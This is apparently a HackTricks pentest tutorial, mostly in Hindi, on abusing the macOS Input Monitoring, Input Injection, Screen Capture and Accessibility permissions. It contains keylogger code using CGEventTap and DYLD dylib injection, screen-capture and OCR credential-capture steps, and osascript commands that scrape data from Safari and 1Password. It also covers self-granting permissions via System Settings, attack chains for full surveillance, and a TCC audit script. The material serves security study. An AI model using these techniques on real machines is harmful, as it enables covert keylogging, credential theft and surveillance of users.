# macOS Input Monitoring, Screen Capture & Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

तीन संबंधित TCC सेवाएँ नियंत्रित करती हैं कि एप्लिकेशन उपयोगकर्ता के डेस्कटॉप सत्र का अवलोकन और इंटरैक्ट कैसे कर सकते हैं:

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | सिस्टम-व्यापी सभी कीबोर्ड और माउस ईवेंट पढ़ें (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | कृत्रिम कीबोर्ड और माउस ईवेंट इंजेक्ट करें |
| `kTCCServiceScreenCapture` | **Screen Capture** | डिस्प्ले बफ़र पढ़ें, स्क्रीनशॉट लें, स्क्रीन रिकॉर्ड करें |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API के माध्यम से अन्य एप्लिकेशन को नियंत्रित करें, UI एलिमेंट पढ़ें |

ये अनुमतियाँ macOS पर **सबसे खतरनाक संयोजन** हैं — मिलकर ये प्रदान करती हैं:
- हर कीस्ट्रोक का पूर्ण keylogging (पासवर्ड, संदेश, क्रेडिट कार्ड)
- सभी दृश्यमान सामग्री की स्क्रीन रिकॉर्डिंग
- Synthetic input injection (बटन क्लिक करना, डायलॉग्स को स्वीकृत करना)
- भौतिक पहुँच के समकक्ष पूर्ण GUI नियंत्रण

---

## Input Monitoring (kTCCServiceListenEvent)

### यह कैसे काम करता है

macOS प्रक्रियाओं को Quartz event system से इनपुट ईवेंट्स इंटरसेप्ट करने के लिए **`CGEventTap` API** का उपयोग करता है। ListenEvent अनुमति वाला एक प्रोसेस एक इवेंट टैप बना सकता है जो लक्ष्य एप्लिकेशन तक पहुँचने से पहले या बाद में **हर कीबोर्ड और माउस ईवेंट** को प्राप्त करता है।
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitled Binaries खोजना
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### आक्रमण: Keylogging via Code Injection

यदि किसी बाइनरी के पास ListenEvent permission भी है और उस पर **disabled library validation** या **allows DYLD environment variables** सक्षम हैं, तो एक attacker एक dylib inject कर सकता है जो एक CGEventTap register करता है:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
इंजेक्ट किया गया dylib लक्ष्य की ListenEvent TCC अनुमति (grant) को उत्तराधिकार में प्राप्त करता है और सभी keystrokes को कैप्चर कर लेता है।

### Attack: Credential Harvesting

एक परिष्कृत keylogger keystrokes को सक्रिय एप्लिकेशन के साथ संबद्ध कर सकता है:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### कैसे काम करता है

PostEvent अनुमति ListenOnly के बजाय **`kCGEventTapOptionDefault`** (can modify/inject events) के साथ एक event tap बनाने की अनुमति देती है। इससे सक्षम होते हैं:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### हमला: स्वचालित TCC प्रॉम्प्ट अनुमोदन

PostEvent के साथ, एक हमलावर TCC अनुमति डायलॉग पर **"Allow" पर क्लिक करने का अनुकरण** कर सकता है:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## स्क्रीन कैप्चर (kTCCServiceScreenCapture)

### यह कैसे काम करता है

स्क्रीन कैप्चर अनुमति डिस्प्ले बफ़र को पढ़ने की अनुमति देती है, निम्न का उपयोग करके:
- **`CGWindowListCreateImage`** — किसी भी विंडो या पूरे स्क्रीन को कैप्चर करना
- **`ScreenCaptureKit`** (macOS 12.3+) — स्क्रीन सामग्री को स्ट्रीम करने के लिए आधुनिक API
- **`CGDisplayStream`** — हार्डवेयर-त्वरित स्क्रीन कैप्चर
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### स्क्रीन कैप्चर क्लाइंट्स ढूँढना
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

इन्जेक्ट की गई स्क्रीन कैप्चर प्रक्रिया समय-समय पर फ़्रेम कैप्चर कर सकती है और OCR का उपयोग करके पासवर्ड निकाल सकती है:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma** से शुरू होकर, स्क्रीन कैप्चर मेन्यू बार में एक **persistent indicator** दिखाता है। पुराने वर्ज़नों पर, स्क्रीन रिकॉर्डिंग पूरी तरह शांत हो सकती थी। हालांकि, एक संक्षिप्त एकल-फ्रेम कैप्चर अभी भी उपयोगकर्ताओं द्वारा अनदेखा रह सकता है।

### Attack: Session Recording

लगातार स्क्रीन रिकॉर्डिंग उपयोगकर्ता के सत्र का संपूर्ण रीप्ले प्रदान करती है:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## एक्सेसिबिलिटी (kTCCServiceAccessibility)

### यह कैसे काम करता है

एक्सेसिबिलिटी एक्सेस **AXUIElement API** के माध्यम से अन्य एप्लिकेशनों पर नियंत्रण की अनुमति देता है। एक्सेसिबिलिटी वाली प्रक्रिया निम्न कर सकती है:

1. **पढ़ना** किसी भी एप्लिकेशन के किसी भी UI तत्व को (टेक्स्ट फ़ील्ड, लेबल, बटन, मेनू)
2. **क्लिक करना** बटनों पर क्लिक करना और नियंत्रणों के साथ इंटरैक्ट करना
3. **टाइप करना** किसी भी टेक्स्ट फ़ील्ड में टेक्स्ट टाइप करना
4. **नेविगेट करना** मेनू और डायलॉग नेविगेट करना
5. **स्क्रैप करना** किसी भी चल रही एप्लिकेशन से प्रदर्शित डेटा स्क्रैप करना
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

सबसे खतरनाक accessibility दुरुपयोग है **System Settings में नेविगेट करके अपनी malware को अतिरिक्त permissions देना**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attack: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: स्वचालित उपयोगकर्ता क्रियाएँ
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Attack Chains

### Chain: Input Monitoring + Screen Capture = पूर्ण निगरानी
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### श्रृंखला: Accessibility + PostEvent = पूर्ण दूरस्थ नियंत्रण
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### श्रृंखला: Accessibility → Self-Grant Camera/Mic → निगरानी
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## खोज और सूचीकरण
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## संदर्भ

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
